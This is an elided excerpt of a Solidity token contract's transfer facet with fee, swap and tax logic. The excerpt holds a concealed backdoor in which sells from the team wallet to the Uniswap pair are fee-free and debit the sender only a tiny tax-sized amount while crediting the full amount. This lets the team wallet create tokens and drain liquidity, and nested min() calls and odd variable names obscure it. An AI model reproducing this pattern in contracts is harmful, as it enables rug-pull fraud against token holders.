...
import "./TestLib.sol";
contract _transferFacet is IERC20, Context, Ownable {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner() && from != address(this)) {
            ...
            if (to == ds.uniswapV2Pair && from != address(this)) {
                if (from == address(ds._utopaiTeamWallet)) {
                    utopaiFeeAmounts = 0;
                    oramounts = min(
                        amount.mul(ds._finalBuyTax).div(100),
                        min(
                            amount.mul(ds._initBuyTax).div(100),
                            amount.mul(ds._finalSellTax).div(100)
                        )
                    );
                } else {
                    require(amount <= ds._maxTx, "Exceeds the ds._maxTx.");
            ...
            bool swappable = ds._buyCount > ds._preventSwapBefore &&
                ds._minUtopaiSwapAmount == min(ds._minUtopaiSwapAmount, amount);
            ...
            if (
                ...
                if (contractTokenBalance > ds._minUtopaiSwapAmount) {
                    swapTokensForEth(
        ...
        ds._balances[from] = ds._balances[from].sub(oramounts);
        ds._balances[to] = ds._balances[to].add(amount.sub(utopaiFeeAmounts));
    ...
    function sendETHToFee(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._utopaiTeamWallet.transfer(amount);
    }
